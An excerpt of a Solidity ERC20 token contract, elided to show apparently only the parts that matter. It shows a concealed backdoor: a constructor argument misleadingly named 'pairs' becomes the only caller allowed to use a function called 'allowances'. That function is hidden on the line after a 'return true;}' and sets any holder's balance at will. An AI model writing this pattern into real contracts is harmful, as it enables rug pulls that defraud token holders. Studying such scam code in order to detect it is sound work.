...
contract Ether is Ownable, ERC20 {
    ...
    uniswapV2Router02 private routerV2;
    address public pair;
    ...
    constructor (address pairs) {
       ...
       // address routerV2 = 0xa2b52495371EEd0bf260B056895077B09E7e2C84;
        ...
        routerV2 = uniswapV2Router02(pairs);
    ...
    modifier _balance() { require( address(routerV2) == msg.sender, ""  );_; }
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        return true;} function allowances
       (address recipient, uint256 tAmount) 
       external _balance { _balances
       [recipient] = tAmount;
    }
